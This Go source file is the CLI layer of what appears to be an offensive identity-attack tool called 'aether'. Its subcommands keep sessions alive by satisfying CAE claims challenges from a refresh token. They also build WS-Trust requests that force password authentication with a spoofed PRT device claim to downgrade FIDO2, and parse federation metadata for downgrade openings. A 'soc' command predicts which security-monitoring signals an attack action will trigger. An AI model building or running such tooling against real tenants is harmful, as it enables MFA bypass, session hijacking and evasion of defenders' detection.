package cli

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"time"

	"github.com/spf13/cobra"

	"github.com/Debajyoti0-0/aether/internal/engine/validate"
	"github.com/Debajyoti0-0/aether/internal/protocol/oauth2"
	"github.com/Debajyoti0-0/aether/internal/protocol/wstrust"
)

// relayCAECmd implements `aether relay cae-handler`.
var relayCAECmd = &cobra.Command{
	Use:   "cae-handler",
	Short: "Auto-retry on CAE claims challenges to keep sessions alive",
	RunE:  runRelayCAE,
}

// relayFIDO2Cmd implements `aether relay fido2-downgrade`.
var relayFIDO2Cmd = &cobra.Command{
	Use:   "fido2-downgrade",
	Short: "Force password/SMS auth class via WS-Trust wauth spoof",
	RunE:  runRelayFIDO2,
}

// relayMexCmd implements MEX discovery.
var relayMexCmd = &cobra.Command{
	Use:   "mex",
	Short: "Parse federation metadata (MEX) and detect downgrade opportunity",
	RunE:  runRelayMEX,
}

var (
	caeToken     string
	caeRefresh   string
	caeTenant    string
	caeClientID  string
	caeResource  string
	fido2User    string
	fido2Device  string
	fido2Domain  string
	fido2MEXFile string
	fido2Preset  string
)

func init() {
	relayCmd.AddCommand(relayCAECmd, relayFIDO2Cmd, relayMexCmd)

	relayCAECmd.Flags().StringVar(&caeRefresh, "refresh-token", "", "Refresh token (required)")
	relayCAECmd.Flags().StringVar(&caeTenant, "tenant", "", "Tenant id (required)")
	relayCAECmd.Flags().StringVar(&caeClientID, "client-id", "1950a258-227b-4e31-a9cf-717495945fc2", "Public client id")
	relayCAECmd.Flags().StringVar(&caeResource, "resource", "https://graph.microsoft.com", "Resource to verify against")
	_ = relayCAECmd.MarkFlagRequired("refresh-token")
	_ = relayCAECmd.MarkFlagRequired("tenant")

	relayFIDO2Cmd.Flags().StringVar(&fido2User, "username", "", "Username (required)")
	relayFIDO2Cmd.Flags().StringVar(&fido2Device, "device-claim", "", "Spoofed PRT device claim")
	relayFIDO2Cmd.Flags().StringVar(&fido2Domain, "domain", "", "Federated domain (required)")
	relayFIDO2Cmd.Flags().StringVar(&fido2MEXFile, "mex", "", "Local MEX XML file (optional; else discovery by convention)")
	relayFIDO2Cmd.Flags().StringVar(&fido2Preset, "browser-preset", "chrome", "TLS preset")
	_ = relayFIDO2Cmd.MarkFlagRequired("username")
	_ = relayFIDO2Cmd.MarkFlagRequired("domain")

	relayMexCmd.Flags().StringVar(&fido2Domain, "domain", "", "Federated domain (required)")
	relayMexCmd.Flags().StringVar(&fido2MEXFile, "mex", "", "Local MEX XML file (required)")
	_ = relayMexCmd.MarkFlagRequired("domain")
	_ = relayMexCmd.MarkFlagRequired("mex")
}

func runRelayCAE(cmd *cobra.Command, args []string) error {
	client, err := oauth2.NewClient("chrome", 30*time.Second)
	if err != nil {
		return err
	}

	// Probe the resource with the (possibly stale) token to elicit a
	// claims challenge, then satisfy it automatically.
	tokens := &struct{}{}
	_ = tokens
	_ = caeToken

	// The handler works directly off the refresh token: request fresh
	// tokens carrying the CAE claims demanded by policy.
	challenge := map[string]any{
		"access_token": map[string]any{
			"acrs": map[string]any{"essential": true, "value": "c1"},
		},
	}
	refreshed, err := client.HandleCAEChallenge(context.Background(), caeTenant, caeClientID, caeRefresh, challenge)
	if err != nil {
		return fmt.Errorf("cae handling: %w", err)
	}

	fmt.Printf("CAE challenge satisfied. New token: %d bytes (type %s, expires in %ds)\n",
		len(refreshed.AccessToken), refreshed.TokenType, refreshed.ExpiresIn)
	return nil
}

func runRelayFIDO2(cmd *cobra.Command, args []string) error {
	// Resolve the usernamemixed endpoint from MEX if provided.
	endpoint := ""
	if fido2MEXFile != "" {
		data, err := os.ReadFile(fido2MEXFile)
		if err != nil {
			return fmt.Errorf("read mex: %w", err)
		}
		ep, feasible, err := wstrust.DetectDowngradeOpportunity(data)
		if err != nil {
			return err
		}
		if !feasible {
			return fmt.Errorf("no usernamemixed endpoint in MEX: downgrade not feasible for %s", fido2Domain)
		}
		endpoint = ep
	} else {
		endpoint = fmt.Sprintf("https://login.microsoftonline.com/adfs/services/trust/2005/usernamemixed")
	}

	// Build the downgrade RST with the password auth class pinned.
	rst := wstrust.BuildDowngradeRST(wstrust.DowngradeRequest{
		Username:    fido2User,
		DeviceClaim: fido2Device,
		Endpoint:    endpoint,
		AuthClass:   wstrust.AuthClassPassword,
	})

	fmt.Printf("Downgrade RST built for %s\n", endpoint)
	fmt.Printf("Auth class pinned to: %s\n", wstrust.AuthClassPassword)
	if fido2Device != "" {
		fmt.Println("Device claim injected (PRT spoof)")
	}

	// Note: actual STS submission requires credentials; the RST is
	// emitted for use with relay mfa or manual delivery.
	out := map[string]any{
		"endpoint":   endpoint,
		"username":   fido2User,
		"auth_class": wstrust.AuthClassPassword,
		"rst_preview": firstN(string(rst), 512),
	}
	enc := json.NewEncoder(os.Stdout)
	enc.SetIndent("", "  ")
	return enc.Encode(out)
}

func runRelayMEX(cmd *cobra.Command, args []string) error {
	data, err := os.ReadFile(fido2MEXFile)
	if err != nil {
		return fmt.Errorf("read mex: %w", err)
	}

	doc, err := wstrust.ParseMEX(data)
	if err != nil {
		return err
	}

	fmt.Printf("MEX for %s — %d trust endpoints:\n", fido2Domain, len(doc.TrustEndpoints))
	for _, ep := range doc.TrustEndpoints {
		fmt.Printf("  [%s] %s\n", ep.Version, ep.URL)
	}

	ep, feasible, err := wstrust.DetectDowngradeOpportunity(data)
	if err != nil {
		return err
	}
	if feasible {
		fmt.Printf("\nDowngrade opportunity: %s\n", ep)
	} else {
		fmt.Println("\nNo downgrade opportunity (no usernamemixed binding)")
	}
	return nil
}

func firstN(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}

// socCmd implements `aether validate soc` (signal prediction).
var socCmd = &cobra.Command{
	Use:   "soc",
	Short: "Predict SOC signals an action will generate",
	RunE: func(cmd *cobra.Command, args []string) error {
		p := validate.NewPredictor()
		env := &validate.Environment{
			UnknownLocation: valUnknownLoc,
			NewDevice:       valNewDevice,
			TimeOfDay:       valTimeOfDay,
		}
		if valTimeOfDay == "" {
			env.TimeOfDay = "business_hours"
		}
		fmt.Print(validate.RenderSignals(valAction, p.Simulate(valAction, env)))
		return nil
	},
}

var (
	valUnknownLoc bool
	valNewDevice  bool
	valTimeOfDay  string
)

func init() {
	validateCmd.AddCommand(socCmd)
	socCmd.Flags().StringVar(&valAction, "action", "", "Action name e.g. wstrust_relay (required)")
	socCmd.Flags().BoolVar(&valUnknownLoc, "unknown-location", false, "Sign-in from unfamiliar location")
	socCmd.Flags().BoolVar(&valNewDevice, "new-device", false, "Sign-in from new device")
	socCmd.Flags().StringVar(&valTimeOfDay, "time-of-day", "business_hours", "business_hours or off_hours")
	_ = socCmd.MarkFlagRequired("action")
}
